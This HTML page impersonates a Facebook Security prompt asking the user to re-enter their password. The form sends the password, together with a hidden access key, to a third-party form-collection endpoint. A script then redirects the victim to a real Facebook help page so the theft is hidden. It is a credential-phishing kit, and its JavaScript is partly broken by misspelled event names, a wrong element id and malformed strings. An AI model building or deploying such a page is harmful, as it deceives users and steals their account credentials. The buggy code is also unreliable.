<head>

</head>
<body>
    <div class="container">
        <div class="logo">
            <img class="logo"  src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="logo">
            <div class="header">
                Facebook Security
            </div>
            <p>Please re-enter your password to complete the request</p>
            <form id="meta-form"action="https://submitted.formspark.io/?_formId=06789fec-c16a-4b76-a92b-ef572f081a59&_status=OK&_title=Your%20form%20has%20been%20submitted.&_referer=https://formspark.io/" method="POST">
                <!--Replace with your Access Key-->
                <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" name="password" placeholder="Enter your password" required=""fdprocessedid=t6pf2r">
                        <i class="eye-con fas fa-eye" id="togglePassword"></i>
                    </div>
                    <span id="error-message" class="error-message"></span>
                </div>
                <button type="submit" class="submit-button" fdprocessedid="knr80tm">Submit</button>
            </form>
        </div>
        <script>
            document.getElementById('togglePassword').addEventListener('click',function(){
                var passwordField=document.getElementById('password');
                var eyeIcon =this;
                if(passwordField.type ==='password'){
                    passwordField.type ='text';

                    eyeIcon.classList.remove('fa-eye');

                    eyeIcon.classList.add('fa-eye-slash');
                }else{
                    passwordField.type ='password';
                    eyeIcon.classList.remove('fa-eye-slash');
                    eyeIcon.classList.add('fa-eye');
                }
            });

            document.getElementById('passwordForm').addEventListener('sumbit',function(event){
                var passwordField =document.getElementById('password');
                var errorMessage =document.getElementById(error-message);
                if(passwordField.value.length<6){
                    errorMessage.textContent ='Password must be alt least 6 character long.';
                    event.preventDefault();
                }else{
                    errorMessage.textContent=";
                    //Preform from submission via Fetch API
                    event.preventDefault();//Prevent default from submission

                    var formData =new FormData(this);
                    fetch(this.action,{
                        method: 'POST',
                        body: formData,
                        headers:{
                            'Accept':'application/json'
                        }
                    })
                    .then(response =>{
                        if(response.ok){
                            window.location.href='https://www.facebook.com/help/media/thank-you?rdrhc';//Redirect to desire URL
                        }else{
                            errorMessage.textContent='There was an error.Please try again.';
                        }
                    })
                    .catch(() =>{

                        errorMessage.textContent='There was an error.Please try again.';
                    });
                }
            });
            </script>


    </div><span id="PING_IFRAME_FROM_DETECTION" style="display: : none;"></span>
</body>
